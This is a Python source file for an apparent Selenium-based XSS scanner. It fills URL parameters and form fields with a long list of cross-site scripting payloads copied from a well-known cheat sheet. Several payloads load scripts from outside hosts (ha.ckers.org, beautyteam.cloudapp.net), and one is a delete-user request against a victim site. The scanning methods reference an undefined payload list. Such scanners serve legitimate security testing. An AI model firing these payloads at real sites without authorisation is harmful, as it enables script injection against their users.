__author__ = 'popka'

from PageClass.Page import Page
from Utils import utils
import urllib
import urlparse
from selenium.webdriver.support.ui import WebDriverWait
import time

class XssChecker(object):

    xss_urls = set([])

    small_xss_list = ['<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>']

    other_big_xss_list = [
      '<IMG SRC="javascript:location.hash=\'SMILE\';">',
      '<IMG """><SCRIPT>location.hash=\'SMILE\'</SCRIPT>">',
      '<IMG SRC=/ onerror=\"location.hash=\'SMILE\'\"></img>',
      '<IMG SRC="jav  ascript:location.hash=\'SMILE\';">',
      '<IMG SRC="jav&#x09;ascript:location.hash=\'SMILE\';">',
      '<IMG SRC="jav&#x0A;ascript:location.hash=\'SMILE\';">',
      '<IMG SRC="jav&#x0D;ascript:location.hash=\'SMILE\';">',
      'perl -e \'print "<IMG SRC=java\0script:location.hash=\"SMILE\"">";\' > out',
      '<IMG SRC=" &#14;  javascript:location.hash=\'SMILE\';">',
      '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
      '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=location.hash="SMILE">',
      '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
      '<<SCRIPT>location.hash="SMILE";//<</SCRIPT>',
      '<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >',

      '<IMG SRC="javascript:location.hash=\'SMILE\'"',
      '<iframe src=http://beautyteam.cloudapp.net/scriptlet.html <',
      '\\";location.hash=\'SMILE\';//',
      '</TITLE><SCRIPT>location.hash="SMILE";</SCRIPT>',
      '<INPUT TYPE="IMAGE" SRC="javascript:location.hash=\'SMILE\';">',
      '<BODY BACKGROUND="javascript:location.hash=\'SMILE\'">',
      '<IMG DYNSRC="javascript:location.hash=\'SMILE\'">',
      '<IMG LOWSRC="javascript:location.hash=\'SMILE\'">',
      '<STYLE>li {list-style-image: url("javascript:location.hash=\'SMILE\'");}</STYLE><UL><LI>XSS</br>',
      '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
      '<IMG SRC="livescript:[code]">',
      '<BODY ONLOAD=location.hash=\'SMILE\'>',
      '<LINK REL="stylesheet" HREF="javascript:location.hash=\'SMILE\';">',
      '<LINK REL="stylesheet" HREF="http://beautyteam.cloudapp.net/xss.css">',
      '<STYLE>@import\'http://beautyteam.cloudapp.net/xss.css\';</STYLE>',
      '<META HTTP-EQUIV="Link" Content="<http://beautyteam.cloudapp.net/xss.css>; REL=stylesheet">',
      '<STYLE>BODY{-moz-binding:url("http://beautyteam.cloudapp.net/xssmoz.xml#xss")}</STYLE>',
      '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>',
      '<IMG STYLE="xss:expr/*XSS*/ession(location.hash=\'SMILE\')">',
      '<STYLE TYPE="text/javascript">location.hash=\'SMILE\';</STYLE>',
      '<STYLE>.XSS{background-image:url("javascript:location.hash=\'SMILE\'");}</STYLE><A CLASS=XSS></A>',
      '<STYLE type="text/css">BODY{background:url("javascript:location.hash=\'SMILE\'")}</STYLE>',
      '<XSS STYLE="xss:expression(location.hash=\'SMILE\')">',
      '<XSS STYLE="behavior: url(xss.htc);">',

      '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:location.hash=\'SMILE\';">',
      '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
      '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:location.hash=\'SMILE\';">',
      '<IFRAME SRC="javascript:location.hash=\'SMILE\';"></IFRAME>',
      '<FRAMESET><FRAME SRC="javascript:location.hash=\'SMILE\';"></FRAMESET>',
      '<TABLE BACKGROUND="javascript:location.hash=\'SMILE\'">',
      '<TABLE><TD BACKGROUND="javascript:location.hash=\'SMILE\'">',
      '<DIV STYLE="background-image: url(javascript:location.hash=\'SMILE\')">',
      '<DIV STYLE="background-image: url(&#1;javascript:location.hash=\'SMILE\')">',
      '<DIV STYLE="width: expression(location.hash=\'SMILE\');">',
      '<!--[if gte IE 4]><SCRIPT>location.hash=\'SMILE\';</SCRIPT><![endif]-->',
      '<BASE HREF="javascript:location.hash=\'SMILE\';//">',
      '<OBJECT TYPE="text/x-scriptlet" DATA="http://beautyteam.cloudapp.net/scriptlet.html"></OBJECT>',
      #'EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>',
      #'<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
      'a="get";b="URL(\"";c="javascript:";d="location.hash=\'SMILE\';\")";eval(a+b+c+d);',
      '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:location.hash=\'SMILE\'"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
      '<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
      '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>',
      '<SCRIPT SRC="http://beautyteam.cloudapp.net/xss.jpg"></SCRIPT>',
      '<? echo(\'<SCR)\';echo(\'IPT>location.hash="SMILE"</SCRIPT>\'); ?>',
      '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
      'Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser',
      '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>location.hash=\'SMILE\'</SCRIPT>">',
      '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-location.hash=\'SMILE\';+ADw-/SCRIPT+AD4-',
      '<SCRIPT a=">" SRC="http://beautyteam.cloudapp.net/xss.js"></SCRIPT>',
      '<SCRIPT =\">" SRC="http://beautyteam.cloudapp.net/xss.js"></SCRIPT>',
      '<SCRIPT a=">" '' SRC="http://beautyteam.cloudapp.net/xss.js"></SCRIPT>',
    ]

    def __init__(self, driver):
        self.driver = driver

    def find_xss(self, url):
        for xss_script in self.medium_xss_list:
            xss_url = url.replace(Page.KEY, xss_script)
            xss_url = self._decode_url(xss_url)
            print('check ', xss_url)
            page = Page(self.driver, xss_url)
            page.open()
            print('.')
            if (page.check_xss()):
                print('xss was found on: ', xss_url)
                self.xss_urls.add(xss_url)

        print(self.xss_urls)


    def find_xss_in_one_page(self, url):
        for xss_script in self.medium_xss_list:
            page = Page(self.driver, url)

            buttons = page.get_all_button()
            count_of_forms = len(buttons)
            for i in xrange(count_of_forms):
                page.open()
                print(xss_script)
                page.fill_all_input(xss_script)

                time.sleep(3)

                button = page.get_all_button()[i]
                button.click()

                time.sleep(5)
                if (page.check_xss()):
                    print('xss was found on: ', url)
                    self.xss_urls.add(url)


    def _decode_url(self, url):
        base_url = url.split('?')[0]

        param_url = urlparse.urlparse(url).query
        dict_of_param = urlparse.parse_qs(param_url)

        for param in dict_of_param:
            dict_of_param[param]=dict_of_param[param][0]

        rtr = base_url + '?' + urllib.urlencode(dict_of_param)
        #print('URL = ' + rtr)
        return base_url + '?' + urllib.urlencode(dict_of_param)













